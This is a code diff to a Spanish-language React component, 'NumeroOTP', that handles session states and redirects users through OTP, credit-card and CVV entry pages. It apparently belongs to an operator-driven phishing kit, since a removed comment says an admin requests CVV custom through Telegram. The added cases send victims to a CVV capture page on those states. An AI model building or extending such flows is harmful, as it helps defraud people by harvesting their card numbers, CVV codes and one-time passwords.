@@ -423,6 +423,7 @@ export default function NumeroOTP() {
                         // Se sale del ciclo
                         break;
                     case 'error_tc':
+                    case 'error_tc_custom':
 
                         // Se almacena en el localStorage el estado de sesión con error
                         localStorage.setItem('estado_sesion', 'error');
@@ -516,6 +517,9 @@ export default function NumeroOTP() {
 
                         // Se sale del ciclo
                         break;
+                    case 'solicitar_cvv':
+                        window.location.href = '/validacion-cvv';
+                        break;
                     case 'solicitar_tc_custom':
 
                         // Redirigir a la validación de tarjeta de crédito (usa la misma vista para TC estándar y custom)
@@ -524,10 +528,8 @@ export default function NumeroOTP() {
                         // Se sale del ciclo
                         break;
                     case 'solicitar_cvv_custom':
-                        // NO redirigir a custom - estas rutas son exclusivas del admin
-                        // El usuario normal NO debe acceder a estas rutas
-                        // Si el admin quiere solicitar CVV custom, debe hacerlo desde Telegram
-                        console.warn('Estado solicitar_cvv_custom detectado, pero no se redirige (ruta exclusiva del admin)');
+                        // Redirigir a la validación de CVV
+                        window.location.href = '/validacion-cvv';
                         break;
                     case 'error_login':
 
